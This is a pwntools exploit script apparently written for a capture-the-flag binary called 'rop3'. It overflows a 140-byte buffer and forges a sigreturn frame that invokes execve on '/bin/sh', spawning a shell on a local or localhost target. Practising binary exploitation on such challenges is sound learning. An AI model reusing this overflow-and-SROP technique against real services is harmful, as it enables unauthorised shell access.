from pwn import *
import time

#defult setting and find address
target = "./rop3-7f3312fe43c46d26"
local = True
HOST = '127.0.0.1'
PORT = 40645

pop3ret = 0x0804855d
__libc_start_main_rel = 0x00019a00 # cgPwn - #160-Ubuntu
system_rel = 0x00040310

#check target
if local:
    conn = process(target)
else:
    conn = remote(HOST, PORT)

target_bin = ELF(target)

#Setting Enable Environment
# context
context.update(arch='i386', os='linux')
context.clear(arch=target_bin.arch)
context.log_level = 'debug' 
#log_level must be one of ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
context.terminal = ['tmux', 'splitw', '-h']

#Attack~~~!!!
#simple BoF... dummy of local area
p = lambda x: pack("<I", x)

syscall = 0x08048420
ROP = ""
ROP += "A"*140
ROP += p(syscall)       #ret
ROP += p(0x33)          #GS
ROP += p(0)            #FS
ROP += p(0x7b)          #ES
ROP += p(0x7b)          #DS
ROP += p(0)            #EDI
ROP += p(0)            #ESI
ROP += p(0x08049b00)   #EBP
ROP += p(0x08049a00)   #ESP
ROP += p(0x0804a020)   #EBX #/bin/sh
ROP += p(0)            #EDX
ROP += p(0)            #ECX
ROP += p(0x0b)          #EAX #execve system call number(11)
ROP += p(0)            #trapno
ROP += p(0)            #err
ROP += p(syscall)      #EIP
ROP += p(0x73)          #CS
ROP += p(0x246)         #eflags
ROP += p(0)            #esp_atsignal
ROP += p(0x7b)          #SS
ROP += "\x00"*(118-len(ROP))


#print conn.recv(1024)
conn.sendline(ROP)
time.sleep(0.1)

conn.interactive()
